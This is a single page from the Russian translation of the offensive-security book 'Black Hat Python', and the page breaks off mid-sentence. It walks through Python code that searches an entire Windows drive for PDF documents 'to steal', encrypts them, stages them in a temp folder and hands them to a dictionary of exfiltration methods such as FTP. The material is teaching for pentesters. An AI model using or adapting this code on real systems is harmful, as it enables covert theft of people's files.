# Black Hat Python. Программирование для хакеров и пентестеров — страница 185

Источник: `Black Hat Python. Программирование для хакеров и пентестеров.pdf`

Собираем все вместе   185
Вначале импортируем модули и функции, которые вы только что напи-
сали . Затем создаем словарь EXFIL , значения которого соответствуют
импортированным функциям . Это существенно упростит выполнение
различных вызовов для вывода данных за пределы системы. Мы сделали так,
чтобы значения совпадали с именами функций, так как в Python функции
являются полноценными элементами языка и могут использоваться в каче-
стве параметров. Этот подход иногда называют диспетчеризацией на основе
словаря (dictionary dispatch). По принципу своей работы он очень похож на
инструкцию case в других языках.
Т еперь нужно создать функцию для поиска документов, которые мы хотим
похитить:
def find_docs(doc_type='.pdf'):
    for parent, _, filenames in os.walk('c:\\'): 
        for filename in filenames:
            if filename.endswith(doc_type):
                document_path = os.path.join(parent, filename)
                yield document_path 
Г енератор find_docs обходит всю файловую систему в поиске PDF-докумен-
тов . Найдя такой документ, он возвращает полный путь к нему и передает
поток выполнения обратно вызывающей стороне .
Т еперь создадим главную функцию, чтобы организовать процесс вывода со-
бранной информации:
def exfiltrate(document_path, method): 
    if method in ['transmit', 'plain_ftp']: 
        filename = f'c:\\windows\\temp\\{os.path.basename(document_path)}'
        with open(document_path, 'rb') as f0:
            contents = f0.read()
        with open(filename, 'wb') as f1:
            f1.write(encrypt(contents))
        EXFIL[method](filename) 
        os.unlink(filename)
    else:
        with open(document_path, 'rb') as f: 
            contents = f.read()
        title = os.path.basename(document_path)
        contents = encrypt(contents)
        EXFIL[method](title, contents) 
Мы передаем функции exfiltrate путь к документу и метод передачи данных,
который хотим использовать . Если речь идет о передаче файлов (transmit
